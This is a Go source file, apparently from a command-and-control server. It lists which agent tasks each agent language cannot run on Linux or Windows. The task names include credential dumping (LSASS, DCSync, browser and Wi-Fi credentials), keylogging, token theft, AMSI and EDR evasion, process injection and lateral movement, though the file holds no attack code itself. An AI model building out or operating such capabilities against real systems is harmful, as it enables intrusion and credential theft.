package server

import "strings"

// AgentCapabilities describes limitations that are known from the agent
// implementation. We deliberately publish only confirmed limitations; an
// empty map does not mean that every possible task is implemented.
type AgentCapabilities struct {
	Language    string            `json:"language"`
	OS          string            `json:"os"`
	Unsupported map[string]string `json:"unsupported,omitempty"`
}

func commandReason(reason string, commands ...string) map[string]string {
	out := make(map[string]string, len(commands))
	for _, command := range commands {
		out[command] = reason
	}
	return out
}

func mergeCommandReasons(dst, src map[string]string) {
	for command, reason := range src {
		dst[command] = reason
	}
}

// These lists mirror explicit platform stubs in the agents. They are kept in
// the server so every API client gets the same answer before queueing a task.
var linuxUnsupportedByLanguage = map[string]map[string]string{
	"go": commandReason("Windows-only agent feature",
		"ADCS_REQUEST", "ADS_DEL", "ADS_LIST", "ADS_READ", "ADS_WRITE",
		"AMSI_BYPASS", "BLOCKDLLS", "BOF", "BROWSER_CREDS", "CLIP_GET", "CLIP_MONITOR_DUMP",
		"CLIP_MONITOR_START", "CLIP_MONITOR_STOP", "CLR_STOMP", "COM_HIJACK",
		"DCSYNC", "DOTNET_EXEC", "EDR_SILENCE", "EDR_SILENCE_RM",
		"ELEVATE", "EVENTLOG_RESUME", "EVENTLOG_SUSPEND", "EXEC_PE",
		"FORK_RUN", "GEN_LNK", "GETSYSTEM", "GPP_HUNT", "GPP_PASSWORDS",
		"HOLLOW", "INJECT_APC", "INJECT_REMOTE", "KERB_LIST", "KERB_PTT",
		"KERB_PURGE", "KEYLOG_DUMP", "KEYLOG_START", "KEYLOG_STOP",
		"LSASS_DUMP_NT", "MINIDUMP", "NTDS_DUMP", "NTDLL_UNHOOK", "PEB_SPOOF",
		"NET_SHARES", "PE_EXEC", "PIPE_START", "PIPE_STOP", "PS_JSON", "REG_DELETE", "REG_LIST",
		"REG_QUERY", "REG_SET", "SCREENSHOT", "SCREENWATCH_START",
		"SCREENWATCH_STOP", "SHELLCODE_STOMP", "STAGE2", "THREAD_HIJACK",
		"TIMESTOMP", "TOKEN_DROP", "TOKEN_MAKE", "TOKEN_STEAL",
		"TOKEN_STORE_CLEAR", "TOKEN_STORE_REMOVE", "TOKEN_STORE_SHOW",
		"TOKEN_STORE_STEAL", "TOKEN_STORE_USE", "UDRL", "WIFI_CREDS",
		"WIPE_MZ", "WINRM_DEPLOY", "WINRM_EXEC", "REV2SELF", "JUMP", "LATERAL",
		"HOOK_CHECK", "HW_BP_CHECK"),

	"rust": commandReason("Windows-only agent feature",
		"ADCS_REQUEST", "AMSI_BYPASS", "BOF", "BROWSER_CREDS", "CLIP_GET",
		"CLIP_MONITOR_DUMP", "CLIP_MONITOR_START", "CLIP_MONITOR_STOP",
		"DCSYNC", "DOTNET_EXEC", "EDR_SILENCE", "EDR_SILENCE_RM", "ELEVATE",
		"EVENTLOG_RESUME", "EVENTLOG_SUSPEND", "FORK_RUN", "GETSYSTEM", "GPP_HUNT",
		"GPP_PASSWORDS", "HOLLOW", "INJECT_APC", "INJECT_REMOTE", "KERB_LIST",
		"KERB_PTT", "KERB_PURGE", "KEYLOG_DUMP", "KEYLOG_START", "KEYLOG_STOP",
		"LSASS_DUMP_NT", "MINIDUMP", "NET_SHARES", "PEB_SPOOF", "PE_EXEC", "PIPE_START",
		"PIPE_STOP", "PERSIST", "PERSIST_RM", "PORT_SCAN", "PPID", "REG_DELETE", "REG_LIST",
		"REG_QUERY", "REG_SET", "SCREENSHOT", "SHELLCODE_STOMP", "STAGE2", "THREAD_HIJACK", "TOKEN_DROP", "TOKEN_MAKE",
		"TOKEN_STEAL", "TOKEN_WHOAMI", "UDRL", "WINRM_DEPLOY", "WINRM_EXEC",
		"WIPE_MZ", "DRIVES", "JUMP", "LATERAL", "AMSI_BYPASS", "HWBP_CLEAR"),

	"nim": commandReason("Windows-only agent feature",
		"BLOCKDLLS", "BROWSER_CREDS", "CLIP_GET", "CLIP_MONITOR_DUMP",
		"CLIP_MONITOR_START", "CLIP_MONITOR_STOP", "COM_HIJACK", "DCSYNC",
		"ADCS_REQUEST", "AMSI_BYPASS", "DOTNET_EXEC", "ELEVATE", "EVENTLOG_RESUME", "EVENTLOG_SUSPEND",
		"FORK_RUN", "GEN_LNK", "GETSYSTEM", "GPP_HUNT", "GPP_PASSWORDS",
		"HOOK_CHECK", "HOLLOW", "HWBP_CLEAR", "HW_BP_CHECK", "INJECT_APC", "INJECT_REMOTE", "ISHELL_CLOSE",
		"ISHELL_OPEN", "ISHELL_RUN", "KERB_LIST", "KERB_PTT", "KERB_PURGE",
		"KEYLOG_DUMP", "KEYLOG_START", "KEYLOG_STOP", "LATERAL", "LSASS_DUMP_NT",
		"MINIDUMP", "NTDS_DUMP", "NTDLL_UNHOOK", "PEB_SPOOF", "PE_EXEC",
		"NET_SHARES", "PIPE_START", "PIPE_STOP", "PERSIST_TASK", "RSOCKS_START", "RSOCKS_STOP", "SESSION_CREDS",
		"SESSION_GOPHER", "TIMESTOMP", "TOKEN_DROP", "TOKEN_MAKE", "TOKEN_STEAL",
		"TOKEN_STORE_CLEAR", "TOKEN_STORE_REMOVE", "TOKEN_STORE_SHOW", "TOKEN_STORE_STEAL",
		"TOKEN_STORE_USE", "WIFI_CREDS", "WINRM_DEPLOY", "WINRM_EXEC",
		"WIPE_MZ", "REV2SELF", "JUMP", "HTTP_PIVOT_START", "HTTP_PIVOT_STOP"),

	// The Linux C dispatcher intentionally contains only core POSIX/file
	// operations, port scan and explicit Windows-only stubs.
	"c": commandReason("Not implemented by the Linux C dispatcher",
		"ADCS_REQUEST", "ADS_DEL", "ADS_LIST", "ADS_READ", "ADS_WRITE",
		"AMSI_BYPASS", "BLOCKDLLS", "BOF", "BROWSER_CREDS", "CLEANUP", "CLIP_GET",
		"CLIP_MONITOR_DUMP", "CLIP_MONITOR_START", "CLIP_MONITOR_STOP", "COM_HIJACK",
		"DCSYNC", "DOTNET_EXEC", "EDR_SILENCE", "EDR_SILENCE_RM", "ELEVATE",
		"EVENTLOG_RESUME", "EVENTLOG_SUSPEND", "EXEC_PE", "FORK_RUN", "GEN_LNK",
		"DRIVES", "GETSYSTEM", "GPP_HUNT", "GPP_PASSWORDS", "HOLLOW", "HOOK_CHECK", "HWBP_CLEAR",
		"HW_BP_CHECK", "HTTP_PIVOT_START",
		"HTTP_PIVOT_STOP", "INJECT_APC", "INJECT_REMOTE", "ISHELL_CLOSE",
		"ISHELL_OPEN", "ISHELL_RUN", "JUMP", "KERB_LIST", "KERB_PTT", "KERB_PURGE",
		"KEYLOG_DUMP", "KEYLOG_START", "KEYLOG_STOP", "LATERAL", "LSASS_DUMP_NT",
		"MINIDUMP", "NTDS_DUMP", "NTDLL_UNHOOK", "PEB_SPOOF", "PE_EXEC",
		"MEM_FLUCTUATE", "NETSTAT", "NET_SHARES", "PIPE_START", "PIPE_STOP", "PORTFWD_ADD", "PORTFWD_DEL", "PORTFWD_LIST",
		"PERSIST", "PERSIST_RM", "REG_DELETE", "REG_LIST", "REG_QUERY", "REG_SET",
		"RSOCKS_START", "RSOCKS_STOP", "SCREENSHOT", "SCREENWATCH_START",
		"SCREENWATCH_STOP", "SHELLCODE_STOMP", "SOCKS_START", "SOCKS_STOP", "STAGE2",
		"TCP_PIVOT_START", "TCP_PIVOT_STOP", "THREAD_HIJACK", "TIMESTOMP",
		"TOKEN_DROP", "TOKEN_MAKE", "TOKEN_STEAL", "TOKEN_STORE_CLEAR", "TOKEN_STORE_REMOVE",
		"TOKEN_STORE_SHOW", "TOKEN_STORE_STEAL", "TOKEN_STORE_USE", "TOKEN_WHOAMI", "UDRL",
		"WIFI_CREDS", "WINRM_DEPLOY", "WINRM_EXEC", "WIPE_MZ", "REV2SELF"),
}

var windowsUnsupportedByLanguage = map[string]map[string]string{
	"nim": commandReason("POSIX metadata is not supported by the Windows Nim agent",
		"CHMOD", "CHOWN", "CHTIMES"),
	"rust": commandReason("POSIX metadata is not supported by the Windows Rust agent",
		"CHMOD", "CHOWN", "CHTIMES"),
	"c": commandReason("POSIX metadata is not supported by the Windows C agent",
		"CHMOD", "CHOWN", "CHTIMES"),
}

func normalizeAgentLanguage(language string) string {
	switch strings.ToLower(strings.TrimSpace(language)) {
	case "golang", "go":
		return "go"
	case "c", "c99", "c++":
		return "c"
	case "rust":
		return "rust"
	case "nim":
		return "nim"
	default:
		return "go"
	}
}

func normalizeAgentOS(osName string) string {
	osName = strings.ToLower(strings.TrimSpace(osName))
	switch {
	case strings.Contains(osName, "windows"):
		return "windows"
	case strings.Contains(osName, "linux"):
		return "linux"
	case strings.Contains(osName, "darwin"), strings.Contains(osName, "macos"):
		return "darwin"
	default:
		return osName
	}
}

func capabilitiesForAgent(agent *Agent) *AgentCapabilities {
	language := normalizeAgentLanguage(agent.Language)
	osName := normalizeAgentOS(agent.OS)
	unsupported := make(map[string]string)
	if osName == "linux" {
		mergeCommandReasons(unsupported, linuxUnsupportedByLanguage[language])
	} else if osName == "windows" {
		mergeCommandReasons(unsupported, windowsUnsupportedByLanguage[language])
	}
	return &AgentCapabilities{Language: language, OS: osName, Unsupported: unsupported}
}

func normalizeTaskType(taskType string) string {
	typ := strings.ToUpper(strings.TrimSpace(taskType))
	switch typ {
	case "STEAL_TOKEN":
		return "TOKEN_STEAL"
	case "EXEC_PE":
		return "PE_EXEC"
	case "CRED_WIFI":
		return "WIFI_CREDS"
	default:
		return typ
	}
}

func unsupportedTaskReason(agent *Agent, taskType string) (string, bool) {
	if agent == nil {
		return "", false
	}
	capabilities := capabilitiesForAgent(agent)
	reason, blocked := capabilities.Unsupported[normalizeTaskType(taskType)]
	return reason, blocked
}
